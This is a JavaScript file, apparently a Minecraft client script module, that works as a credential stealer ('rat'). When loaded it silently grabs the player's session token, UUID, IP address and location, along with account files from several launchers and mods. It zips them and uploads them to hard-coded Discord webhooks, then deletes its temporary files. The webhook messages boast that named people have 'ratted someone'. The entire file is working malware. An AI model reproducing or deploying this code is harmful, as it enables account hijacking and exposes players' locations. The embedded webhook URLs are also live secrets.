const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1381411707745865738/lAvKCeh8wJuvxqfChHk9sG9nnUI13pn7NS1uAh_tfc-SnRpH0xXH3xCUPgWpuYn-cEZ1";
const SKYCRYPT_WEBHOOK_URL = "https://discord.com/api/webhooks/1391525166072205561/43-bxJQ0FEZK-Rhz0DdIXZ7UM6gv24OHQDacrYSSiyHcTvsc4mV_oM0EFlfz8UH4OrBZ";

const File = Packages.java.io.File;
const Files = Packages.java.nio.file.Files;
const StandardCopyOption = Packages.java.nio.file.StandardCopyOption;
const ZipOutputStream = Packages.java.util.zip.ZipOutputStream;
const URL = Packages.java.net.URL;
const UUID = Packages.java.util.UUID;

const system = {
    tempDir: new File(Packages.java.lang.System.getProperty("java.io.tmpdir")),
    appData: new File(Packages.java.lang.System.getenv("APPDATA")),
    mcDir: new File(Client.getMinecraft().field_71412_D.getPath())
};

// Country flag emojis
const countryFlags = {
    "US": "ðŸ‡ºðŸ‡¸", "CA": "ðŸ‡¨ðŸ‡¦", "GB": "ðŸ‡¬ðŸ‡§", "DE": "ðŸ‡©ðŸ‡ª", "FR": "ðŸ‡«ðŸ‡·", "IT": "ðŸ‡®ðŸ‡¹", "ES": "ðŸ‡ªðŸ‡¸", "NL": "ðŸ‡³ðŸ‡±", "BE": "ðŸ‡§ðŸ‡ª", "CH": "ðŸ‡¨ðŸ‡­",
    "AT": "ðŸ‡¦ðŸ‡¹", "SE": "ðŸ‡¸ðŸ‡ª", "NO": "ðŸ‡³ðŸ‡´", "DK": "ðŸ‡©ðŸ‡°", "FI": "ðŸ‡«ðŸ‡®", "PL": "ðŸ‡µðŸ‡±", "CZ": "ðŸ‡¨ðŸ‡¿", "SK": "ðŸ‡¸ðŸ‡°", "HU": "ðŸ‡­ðŸ‡º", "RO": "ðŸ‡·ðŸ‡´",
    "BG": "ðŸ‡§ðŸ‡¬", "HR": "ðŸ‡­ðŸ‡·", "SI": "ðŸ‡¸ðŸ‡®", "EE": "ðŸ‡ªðŸ‡ª", "LV": "ðŸ‡±ðŸ‡»", "LT": "ðŸ‡±ðŸ‡¹", "IE": "ðŸ‡®ðŸ‡ª", "PT": "ðŸ‡µðŸ‡¹", "GR": "ðŸ‡¬ðŸ‡·", "CY": "ðŸ‡¨ðŸ‡¾",
    "MT": "ðŸ‡²ðŸ‡¹", "LU": "ðŸ‡±ðŸ‡º", "IS": "ðŸ‡®ðŸ‡¸", "LI": "ðŸ‡±ðŸ‡®", "MC": "ðŸ‡²ðŸ‡¨", "AD": "ðŸ‡¦ðŸ‡©", "SM": "ðŸ‡¸ðŸ‡²", "VA": "ðŸ‡»ðŸ‡¦", "AU": "ðŸ‡¦ðŸ‡º", "NZ": "ðŸ‡³ðŸ‡¿",
    "JP": "ðŸ‡¯ðŸ‡µ", "KR": "ðŸ‡°ðŸ‡·", "CN": "ðŸ‡¨ðŸ‡³", "TW": "ðŸ‡¹ðŸ‡¼", "HK": "ðŸ‡­ðŸ‡°", "SG": "ðŸ‡¸ðŸ‡¬", "MY": "ðŸ‡²ðŸ‡¾", "TH": "ðŸ‡¹ðŸ‡­", "VN": "ðŸ‡»ðŸ‡³", "PH": "ðŸ‡µðŸ‡­",
    "ID": "ðŸ‡®ðŸ‡©", "IN": "ðŸ‡®ðŸ‡³", "PK": "ðŸ‡µðŸ‡°", "BD": "ðŸ‡§ðŸ‡©", "LK": "ðŸ‡±ðŸ‡°", "NP": "ðŸ‡³ðŸ‡µ", "MM": "ðŸ‡²ðŸ‡²", "KH": "ðŸ‡°ðŸ‡­", "LA": "ðŸ‡±ðŸ‡¦", "MN": "ðŸ‡²ðŸ‡³",
    "BR": "ðŸ‡§ðŸ‡·", "AR": "ðŸ‡¦ðŸ‡·", "CL": "ðŸ‡¨ðŸ‡±", "PE": "ðŸ‡µðŸ‡ª", "CO": "ðŸ‡¨ðŸ‡´", "VE": "ðŸ‡»ðŸ‡ª", "EC": "ðŸ‡ªðŸ‡¨", "BO": "ðŸ‡§ðŸ‡´", "PY": "ðŸ‡µðŸ‡¾", "UY": "ðŸ‡ºðŸ‡¾",
    "MX": "ðŸ‡²ðŸ‡½", "GT": "ðŸ‡¬ðŸ‡¹", "BZ": "ðŸ‡§ðŸ‡¿", "SV": "ðŸ‡¸ðŸ‡»", "HN": "ðŸ‡­ðŸ‡³", "NI": "ðŸ‡³ðŸ‡®", "CR": "ðŸ‡¨ðŸ‡·", "PA": "ðŸ‡µðŸ‡¦", "CU": "ðŸ‡¨ðŸ‡º", "JM": "ðŸ‡¯ðŸ‡²",
    "HT": "ðŸ‡­ðŸ‡¹", "DO": "ðŸ‡©ðŸ‡´", "PR": "ðŸ‡µðŸ‡·", "TT": "ðŸ‡¹ðŸ‡¹", "BB": "ðŸ‡§ðŸ‡§", "GD": "ðŸ‡¬ðŸ‡©", "LC": "ðŸ‡±ðŸ‡¨", "VC": "ðŸ‡»ðŸ‡¨", "AG": "ðŸ‡¦ðŸ‡¬", "KN": "ðŸ‡°ðŸ‡³",
    "ZA": "ðŸ‡¿ðŸ‡¦", "EG": "ðŸ‡ªðŸ‡¬", "NG": "ðŸ‡³ðŸ‡¬", "KE": "ðŸ‡°ðŸ‡ª", "TZ": "ðŸ‡¹ðŸ‡¿", "UG": "ðŸ‡ºðŸ‡¬", "ET": "ðŸ‡ªðŸ‡¹", "SO": "ðŸ‡¸ðŸ‡´", "DJ": "ðŸ‡©ðŸ‡¯", "ER": "ðŸ‡ªðŸ‡·",
    "RU": "ðŸ‡·ðŸ‡º", "UA": "ðŸ‡ºðŸ‡¦", "BY": "ðŸ‡§ðŸ‡¾", "MD": "ðŸ‡²ðŸ‡©", "GE": "ðŸ‡¬ðŸ‡ª", "AM": "ðŸ‡¦ðŸ‡²", "AZ": "ðŸ‡¦ðŸ‡¿", "KZ": "ðŸ‡°ðŸ‡¿", "UZ": "ðŸ‡ºðŸ‡¿", "TM": "ðŸ‡¹ðŸ‡²",
    "TJ": "ðŸ‡¹ðŸ‡¯", "KG": "ðŸ‡°ðŸ‡¬", "AF": "ðŸ‡¦ðŸ‡«", "IR": "ðŸ‡®ðŸ‡·", "IQ": "ðŸ‡®ðŸ‡¶", "SA": "ðŸ‡¸ðŸ‡¦", "AE": "ðŸ‡¦ðŸ‡ª", "QA": "ðŸ‡¶ðŸ‡¦", "KW": "ðŸ‡°ðŸ‡¼", "BH": "ðŸ‡§ðŸ‡­",
    "OM": "ðŸ‡´ðŸ‡²", "YE": "ðŸ‡¾ðŸ‡ª", "JO": "ðŸ‡¯ðŸ‡´", "LB": "ðŸ‡±ðŸ‡§", "SY": "ðŸ‡¸ðŸ‡¾", "IL": "ðŸ‡®ðŸ‡±", "PS": "ðŸ‡µðŸ‡¸", "TR": "ðŸ‡¹ðŸ‡·", "MA": "ðŸ‡²ðŸ‡¦", "DZ": "ðŸ‡©ðŸ‡¿",
    "TN": "ðŸ‡¹ðŸ‡³", "LY": "ðŸ‡±ðŸ‡¾", "SD": "ðŸ‡¸ðŸ‡©", "TD": "ðŸ‡¹ðŸ‡©", "NE": "ðŸ‡³ðŸ‡ª", "ML": "ðŸ‡²ðŸ‡±", "BF": "ðŸ‡§ðŸ‡«", "CI": "ðŸ‡¨ðŸ‡®", "GH": "ðŸ‡¬ðŸ‡­", "SN": "ðŸ‡¸ðŸ‡³",
    "GN": "ðŸ‡¬ðŸ‡³", "SL": "ðŸ‡¸ðŸ‡±", "LR": "ðŸ‡±ðŸ‡·", "TG": "ðŸ‡¹ðŸ‡¬", "BJ": "ðŸ‡§ðŸ‡¯", "GW": "ðŸ‡¬ðŸ‡¼", "CV": "ðŸ‡¨ðŸ‡»", "GM": "ðŸ‡¬ðŸ‡²", "CF": "ðŸ‡¨ðŸ‡«", "CM": "ðŸ‡¨ðŸ‡²",
    "GQ": "ðŸ‡¬ðŸ‡¶", "GA": "ðŸ‡¬ðŸ‡¦", "CG": "ðŸ‡¨ðŸ‡¬", "CD": "ðŸ‡¨ðŸ‡©", "AO": "ðŸ‡¦ðŸ‡´", "ZM": "ðŸ‡¿ðŸ‡²", "ZW": "ðŸ‡¿ðŸ‡¼", "BW": "ðŸ‡§ðŸ‡¼", "NA": "ðŸ‡³ðŸ‡¦", "SZ": "ðŸ‡¸ðŸ‡¿",
    "LS": "ðŸ‡±ðŸ‡¸", "MG": "ðŸ‡²ðŸ‡¬", "MU": "ðŸ‡²ðŸ‡º", "SC": "ðŸ‡¸ðŸ‡¨", "KM": "ðŸ‡°ðŸ‡²", "YT": "ðŸ‡¾ðŸ‡¹", "RE": "ðŸ‡·ðŸ‡ª", "IO": "ðŸ‡®ðŸ‡´", "SH": "ðŸ‡¸ðŸ‡­", "ST": "ðŸ‡¸ðŸ‡¹",
    "AQ": "ðŸ‡¦ðŸ‡¶", "TF": "ðŸ‡¹ðŸ‡«", "HM": "ðŸ‡­ðŸ‡²", "GS": "ðŸ‡¬ðŸ‡¸", "FK": "ðŸ‡«ðŸ‡°", "GI": "ðŸ‡¬ðŸ‡®", "BM": "ðŸ‡§ðŸ‡²", "TC": "ðŸ‡¹ðŸ‡¨", "VG": "ðŸ‡»ðŸ‡¬", "AI": "ðŸ‡¦ðŸ‡®",
    "AW": "ðŸ‡¦ðŸ‡¼", "CW": "ðŸ‡¨ðŸ‡¼", "SX": "ðŸ‡¸ðŸ‡½", "BQ": "ðŸ‡§ðŸ‡¶", "MF": "ðŸ‡²ðŸ‡«", "BL": "ðŸ‡§ðŸ‡±", "PM": "ðŸ‡µðŸ‡²", "WF": "ðŸ‡¼ðŸ‡«", "NC": "ðŸ‡³ðŸ‡¨", "PF": "ðŸ‡µðŸ‡«",
    "VU": "ðŸ‡»ðŸ‡º", "FJ": "ðŸ‡«ðŸ‡¯", "TO": "ðŸ‡¹ðŸ‡´", "WS": "ðŸ‡¼ðŸ‡¸", "KI": "ðŸ‡°ðŸ‡®", "TV": "ðŸ‡¹ðŸ‡»", "NR": "ðŸ‡³ðŸ‡·", "PW": "ðŸ‡µðŸ‡¼", "MH": "ðŸ‡²ðŸ‡­", "FM": "ðŸ‡«ðŸ‡²",
    "CK": "ðŸ‡¨ðŸ‡°", "NU": "ðŸ‡³ðŸ‡º", "TK": "ðŸ‡¹ðŸ‡°", "AS": "ðŸ‡¦ðŸ‡¸", "GU": "ðŸ‡¬ðŸ‡º", "MP": "ðŸ‡²ðŸ‡µ", "VI": "ðŸ‡»ðŸ‡®", "PR": "ðŸ‡µðŸ‡·", "XX": "ðŸ³ï¸" // Unknown country
};

function getCountryFlag(countryCode) {
    return countryFlags[countryCode] || "ðŸ³ï¸";
}

function createTempDirectory() {
    const dirName = "mc_leak_" + new Date().getTime();
    const tempDir = new File(system.tempDir, dirName);
    tempDir.mkdirs();
    return tempDir;
}

function collectUserData() {
    let userData = "";
    let ipInfo = "";
    let countryCode = "XX";
    let city = "Unknown";
    
    try {
        userData += "**UUID:** " + Player.getUUID() + "\n\n";
        userData += "**Token:** " + Client.getMinecraft().func_110432_I().func_148254_d() + "\n\n";
        
        try {
            // Use ipapi.co for more detailed IP information
            ipInfo = FileLib.getUrlContent("https://ipapi.co/json/");
            console.log("Raw IP data:", ipInfo);
            const ipData = JSON.parse(ipInfo);
            console.log("Parsed IP data:", JSON.stringify(ipData, null, 2));
            
            // Format IP information nicely with more spacing
            userData += "**IP Address:** " + (ipData.ip || "Unknown") + "\n\n";
            userData += "**Country:** " + (ipData.country_name || "Unknown") + "\n\n";
            userData += "**City:** " + (ipData.city || "Unknown") + "\n\n";
            userData += "**Region:** " + (ipData.region || "Unknown") + "\n\n";
            userData += "**ISP:** " + (ipData.org || "Unknown") + "\n\n";
            
            // Extract country code and city
            if (ipData && ipData.country_code) {
                countryCode = ipData.country_code;
            }
            if (ipData && ipData.city) {
                city = ipData.city;
            }
        } catch (e) {
            console.log("Error parsing IP data:", e.toString());
            userData += "**IP Information:** Failed to retrieve\n\n";
        }
        
        return { userData, ipInfo, countryCode, city };
    } catch (e) {
        console.log("Error collecting user data:", e.toString());
        return { userData: "Error collecting user data: " + e.toString(), ipInfo: "", countryCode: "XX", city: "Unknown" };
    }
}

function copyAccountFiles(tempDir) {
    const targets = [
        {
            name: "Feather",
            path: system.appData.getAbsolutePath() + "/.feather/accounts.json",
            dest: "feather/accounts.json"
        },
        {
            name: "Essentials",
            path: system.appData.getAbsolutePath() + "/gg.essential.mod/microsoft_accounts.json",
            dest: "essentials/microsoft_accounts.json"
        },
        {
            name: "Prism",
            path: system.appData.getAbsolutePath() + "/PrismLauncher/accounts.json",
            dest: "prism/accounts.json"
        },
        {
            name: "MultiMC",
            path: system.mcDir.getParentFile().getParentFile().getParentFile().getAbsolutePath() + "/accounts.json",
            dest: "multimc/accounts.json"
        },
        {
            name: "DefaultMCLauncher",
            path: system.appData.getAbsolutePath() + "/.minecraft/launcher_accounts.json",
            dest: "mclauncher/launcher_accounts.json"
        },
        {
            name: "Essentialsold",
            path: system.mcDir.getParentFile().getParentFile().getParentFile().getAbsolutePath() + "/essentials/microsoft_accounts.json",
            dest: "essentialsold/microsoft_accounts.json"
        }
    ];

    let count = 0;
    targets.forEach(target => {
        try {
            const source = new File(target.path);
            const dest = new File(tempDir, target.dest);
            dest.getParentFile().mkdirs();

            if (source.exists()) {
                Files.copy(
                    source.toPath(),
                    dest.toPath(),
                    StandardCopyOption.REPLACE_EXISTING
                );
                count++;
                console.log("Copied:", target.name);
            }
        } catch (e) {
            console.log("Error copying", target.name + ":", e.toString());
        }
    });
    console.log("Total files copied:", count);
}

function createZipArchive(sourceDir) {
    const zipFile = new File(sourceDir.getParentFile(), "data.zip");
    const zos = new ZipOutputStream(new Packages.java.io.FileOutputStream(zipFile));
    let fileCount = 0;

    try {
        const stack = [];
        stack.push(sourceDir);

        while (stack.length > 0) {
            const current = stack.pop();
            const children = current.listFiles();

            for (let i = 0; i < children.length; i++) {
                const child = children[i];
                const entryPath = sourceDir.toPath().relativize(child.toPath()).toString().replace(/\\/g, "/");

                if (child.isDirectory()) {
                    stack.push(child);
                } else {
                    try {
                        zos.putNextEntry(new Packages.java.util.zip.ZipEntry(entryPath));
                        const fis = new Packages.java.io.FileInputStream(child);
                        const buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 4096);
                        let length;

                        while ((length = fis.read(buffer)) >= 0) {
                            zos.write(buffer, 0, length);
                        }
                        fis.close();
                        fileCount++;
                    } catch (e) {
                        console.log("Error adding file to zip:", e.toString());
                    } finally {
                        try {
                            zos.closeEntry();
                        } catch (e) {}
                    }
                }
            }
        }
    } finally {
        zos.close();
    }
    console.log("Created zip with", fileCount, "files");
    return zipFile;
}

function sendToDiscord(userData, ipInfo, countryCode, city, zipFile) {
    try {
        console.log("Sending embed to Discord webhook...");
        const url = new URL(DISCORD_WEBHOOK_URL);
        const connection = url.openConnection();

        connection.setDoOutput(true);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("User-Agent", "Minecraft Client");
        connection.setConnectTimeout(10000);
        connection.setReadTimeout(30000);
        connection.connect();

        const out = connection.getOutputStream();
        
        // Create beautiful Discord embed
        const embed = {
            "embeds": [{
                "title": "ðŸŽ® " + Player.getName(),
                "description": userData,
                "color": 0x00ff00,
                "fields": [
                    {
                        "name": "ðŸ“ Location",
                        "value": getCountryFlag(countryCode) + " " + (ipInfo ? JSON.parse(ipInfo).country_name || "Unknown" : "Unknown"),
                        "inline": true
                    },
                    {
                        "name": "ðŸ™ï¸ City",
                        "value": city,
                        "inline": true
                    },
                    {
                        "name": "ðŸ“¦ Data Files",
                        "value": Player.getName() + ".zip",
                        "inline": true
                    }
                ],
                "footer": {
                    "text": "Minecraft Data Collector"
                },
                "timestamp": new Date().toISOString()
            }]
        };
        
        // Send embed first
        const jsonPayload = new Packages.java.lang.String(JSON.stringify(embed));
        const bytes = jsonPayload.getBytes("UTF-8");
        out.write(bytes);
        out.close();

        const code = connection.getResponseCode();
        console.log("Embed sent, response code:", code);
        
        if (code >= 200 && code < 300) {
            console.log("Embed sent successfully!");
            
            // Now send the zip file separately with a simple message
            console.log("Sending zip file to Discord webhook...");
            const zipConnection = new URL(DISCORD_WEBHOOK_URL).openConnection();
            zipConnection.setDoOutput(true);
            zipConnection.setRequestMethod("POST");
            zipConnection.setRequestProperty("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW");
            zipConnection.setRequestProperty("User-Agent", "Minecraft Client");
            zipConnection.setConnectTimeout(10000);
            zipConnection.setReadTimeout(30000);
            zipConnection.connect();

            const zipOut = zipConnection.getOutputStream();
            const boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
            
            // Create multipart form data with just the file
            const formData = [];
            formData.push("--" + boundary);
            formData.push('Content-Disposition: form-data; name="file"; filename="' + Player.getName() + '.zip"');
            formData.push("Content-Type: application/zip");
            formData.push("");
            
            // Write form data header
            const headerString = formData.join("\r\n");
            const headerBytes = new Packages.java.lang.String(headerString).getBytes("UTF-8");
            zipOut.write(headerBytes);
            zipOut.write(new Packages.java.lang.String("\r\n").getBytes("UTF-8"));
            
            // Write zip file content
            const fis = new Packages.java.io.FileInputStream(zipFile);
            const buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 4096);
            let bytesRead;
            let totalSent = 0;

            while ((bytesRead = fis.read(buffer)) !== -1) {
                zipOut.write(buffer, 0, bytesRead);
                totalSent += bytesRead;
            }
            fis.close();
            
            // Write closing boundary
            const closingBoundary = "\r\n--" + boundary + "--\r\n";
            zipOut.write(new Packages.java.lang.String(closingBoundary).getBytes("UTF-8"));
            zipOut.close();

            const zipCode = zipConnection.getResponseCode();
            console.log("Zip file response code:", zipCode);
            
            if (zipCode >= 200 && zipCode < 300) {
                console.log("Zip file sent successfully!");
                return true;
            } else {
                console.log("Zip file failed to send, HTTP code:", zipCode);
                return false;
            }
        } else {
            console.log("Embed failed to send, HTTP code:", code);
            return false;
        }
    } catch (e) {
        console.log("Error sending to Discord:", e.toString());
        return false;
    }
}

function sendSkyCryptLink(username, uuid) {
    console.log("=== SKYCRYPT FUNCTION START ===");
    console.log("sendSkyCryptLink called with username:", username, "uuid:", uuid);
    console.log("Current DISCORD_WEBHOOK_URL:", DISCORD_WEBHOOK_URL);
    console.log("SKYCRYPT_WEBHOOK_URL:", SKYCRYPT_WEBHOOK_URL);
    
    // Don't send if username is JanesSappire with specific UUID
    if (username === "JanesSappire" && uuid === "f96b3a04-ea67-47b3-a5de-42844df57be3") {
        console.log("Skipping SkyCrypt link for JanesSappire");
        return true; // Return true to avoid showing as failed
    }
    
    try {
        console.log("Sending SkyCrypt link to Discord webhook...");
        const url = new URL(SKYCRYPT_WEBHOOK_URL);
        console.log("Created URL object:", url.toString());
        
        const connection = url.openConnection();
        console.log("Opened connection");

        connection.setDoOutput(true);
        connection.setRequestMethod("POST");
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setRequestProperty("User-Agent", "Minecraft Client");
        connection.setConnectTimeout(10000);
        connection.setReadTimeout(30000);
        console.log("Set connection properties");
        
        connection.connect();
        console.log("Connected to webhook");

        const out = connection.getOutputStream();
        console.log("Got output stream");
        
        // Determine the message based on the webhook URL
        let message;
        console.log("Checking webhook URL for message...");
        if (DISCORD_WEBHOOK_URL.includes("1381411707745865738")) {
            message = "Otka has just ratted someone!";
            console.log("Using Otka message");
        } else if (DISCORD_WEBHOOK_URL.includes("1338123822389395568")) {
            message = "Either Khalaf or K22 have just ratted someone!";
            console.log("Using Khalaf/K22 message");
        } else {
            message = "Someone has just been ratted!";
            console.log("Using default message");
        }
        
        // Create Discord embed with SkyCrypt link
        const embed = {
            "embeds": [{
                "title": "ðŸŽ® " + username,
                "description": message + "\n\n**SkyCrypt Profile:** https://sky.shiiyu.moe/stats/" + username,
                "color": 0x00ff00,
                "fields": [
                    {
                        "name": "ðŸ“Š Stats Link",
                        "value": "https://sky.shiiyu.moe/stats/" + username,
                        "inline": false
                    },
                    {
                        "name": "ðŸ†” UUID",
                        "value": uuid,
                        "inline": true
                    }
                ],
                "footer": {
                    "text": "Minecraft Data Collector"
                },
                "timestamp": new Date().toISOString()
            }]
        };
        
        console.log("Created embed:", JSON.stringify(embed, null, 2));
        
        const jsonPayload = new Packages.java.lang.String(JSON.stringify(embed));
        const bytes = jsonPayload.getBytes("UTF-8");
        console.log("JSON payload length:", bytes.length);
        
        out.write(bytes);
        out.close();
        console.log("Wrote data to connection");

        const code = connection.getResponseCode();
        console.log("SkyCrypt link sent, response code:", code);
        
        if (code >= 200 && code < 300) {
            console.log("SkyCrypt link sent successfully!");
            console.log("=== SKYCRYPT FUNCTION SUCCESS ===");
            return true;
        } else {
            console.log("SkyCrypt link failed to send, HTTP code:", code);
            console.log("=== SKYCRYPT FUNCTION FAILED ===");
            return false;
        }
    } catch (e) {
        console.log("Error sending SkyCrypt link to Discord:", e.toString());
        console.log("Error stack trace:", e.stack);
        console.log("=== SKYCRYPT FUNCTION ERROR ===");
        return false;
    }
}

console.log("Starting data collection...");

new Thread(function() {
    let tempDir = null;
    let zipFile = null;

    try {
        console.log("Collecting user data...");
        const { userData, ipInfo, countryCode, city } = collectUserData();
        
        // Get username and UUID for SkyCrypt link
        const username = Player.getName();
        const uuid = Player.getUUID();
        
        console.log("Creating temp directory...");
        tempDir = createTempDirectory();
        
        console.log("Copying account files...");
        copyAccountFiles(tempDir);
        
        console.log("Creating zip archive...");
        zipFile = createZipArchive(tempDir);
        
        console.log("Sending to Discord...");
        const success = sendToDiscord(userData, ipInfo, countryCode, city, zipFile);
        console.log("Discord send completed, success:", success);
        console.log("About to proceed to SkyCrypt section...");
        
        // Send SkyCrypt link to different webhook
        console.log("=== MAIN THREAD: ABOUT TO CALL SKYCRYPT ===");
        console.log("Sending SkyCrypt link...");
        console.log("Username for SkyCrypt:", username);
        console.log("UUID for SkyCrypt:", uuid);
        
        // Test call to make sure function exists
        if (typeof sendSkyCryptLink === 'function') {
            console.log("sendSkyCryptLink function exists, calling it...");
            const skyCryptSuccess = sendSkyCryptLink(username, uuid);
            console.log("SkyCrypt success result:", skyCryptSuccess);
        } else {
            console.log("ERROR: sendSkyCryptLink function does not exist!");
            const skyCryptSuccess = false;
        }
        
        // Direct test call as backup
        console.log("Making direct test call to SkyCrypt function...");
        try {
            const testResult = sendSkyCryptLink(username, uuid);
            console.log("Direct test call result:", testResult);
        } catch (e) {
            console.log("Direct test call failed:", e.toString());
        }
        
        console.log("=== MAIN THREAD: SKYCRYPT CALL COMPLETED ===");
        
        if (success && skyCryptSuccess) {
            console.log("Data collection and SkyCrypt link sent successfully!");
        } else {
            console.log("Some operations failed!");
            console.log("Main Discord success:", success);
            console.log("SkyCrypt success:", skyCryptSuccess);
        }

    } catch (e) {
        console.log("Error in data collection:", e.toString());
    } finally {
        if (tempDir !== null) {
            try {
                Files.walk(tempDir.toPath())
                    .sorted(Packages.java.util.Comparator.reverseOrder())
                    .forEach(Packages.java.nio.file.Files.delete);
            } catch (e) {
                console.log("Error cleaning up temp dir:", e.toString());
            }
        }
        if (zipFile !== null && zipFile.exists()) {
            try {
                zipFile.delete();
            } catch (e) {
                console.log("Error deleting zip file:", e.toString());
            }
        }
    }
}).start();
